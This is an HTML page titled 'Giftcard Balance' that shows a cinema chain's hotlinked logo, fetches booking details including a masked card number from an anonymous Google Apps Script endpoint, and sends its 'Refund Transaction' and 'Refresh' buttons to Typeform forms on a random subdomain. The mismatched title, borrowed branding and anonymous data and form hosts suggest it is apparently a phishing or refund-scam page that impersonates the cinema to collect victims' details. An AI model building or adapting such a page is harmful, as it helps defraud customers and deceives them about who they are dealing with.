<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giftcard Balance</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212; /* Fondo oscuro */
            color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            max-width: 400px;
            padding: 20px;
            background-color: #1a1a1a;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
        }
        #loadingMessage {
            font-size: 18px;
            color: #aaaaaa;
            margin-bottom: 20px;
            animation: fadein 2s ease-in-out;
        }
        .button-container {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .button-container button {
            padding: 10px;
            font-size: 16px;
            background-color: #fbb03b;
            color: #1a1a1a;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .button-container button:hover {
            background-color: #ffcf70;
        }
        #logo {
            width: 120px;
            margin-bottom: 15px;
        }
        #balanceDisplay {
            margin-top: 20px;
            font-size: 18px;
        }
        /* Animación */
        @keyframes fadein {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <img id="logo" src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20240904.1" alt="Logo">
        
        <p id="loadingMessage">Loading booking details...</p>
        
        <div class="button-container">
            <button id="partialRefundButton" onclick="partialRefundBalance()" style="display:none;">Refund Partial Transaction</button>
            <button id="continueButton" onclick="fetchBalance()">Check BookingID Details</button>
            <button id="redeemButton" onclick="redeemBalance()" style="display:none;">Refund Transaction</button>
            <button id="refreshButton" onclick="refreshPage()" style="display:none;">Refresh</button>
        </div>
    </div>

    <div id="balanceDisplay" style="display:none;"></div>

    <script>
        // Mostrar el botón de continuar después de 5 segundos
        setTimeout(function() {
            document.getElementById("loadingMessage").style.display = "none";
            document.getElementById("continueButton").style.display = "block";
        }, 5000);

        // Función para obtener los datos
        function fetchBalance() {
            document.getElementById("continueButton").style.display = "none";

            fetch('https://script.google.com/macros/s/AKfycbyCTf4vsO3FTvl8MLp6fMDlqtUvR6yyKKnfMBzVd4E2Y3-qvYUlS2xo2oKH9Kfeuu_s/exec')
                .then(response => response.json())
                .then(data => {
                    const display = `
                        <p>BookingID: ${data.A2}</p>
                        <p>MaskedCreditCardNumber: ${data.B2}</p>
                        <p>CardType: ${data.C2}</p>
                        <p>Cinema: ${data.D2}</p>
                        <p>TicketPrice:$ ${data.E2}</p>
                        <p>BookingFee:$ ${data.F2}</p>
                        <p>Sequence: ${data.H2}</p>
                        <p>TicketType: ${data.J2}</p>
                        <p>TicketPrice:$ ${data.L2}</p>
                    `;
                    document.getElementById("balanceDisplay").innerHTML = display;
                    document.getElementById("balanceDisplay").style.display = "block";

                    document.getElementById("partialRefundButton").style.display = "block";
                    document.getElementById("redeemButton").style.display = "block";
                    document.getElementById("refreshButton").style.display = "block";
                })
                .catch(error => console.error('Error fetching balance:', error));
        }

        function partialRefundBalance() {
            window.location.href = 'https://qkstzdro6ry.typeform.com/to/X7fORec0';
        }

        function redeemBalance() {
            window.location.href = 'https://qkstzdro6ry.typeform.com/to/bSJ8YkcX';
        }

        function refreshPage() {
            window.location.href = 'https://qkstzdro6ry.typeform.com/to/MIf1SW2o';
        }
    </script>
</body>
</html>
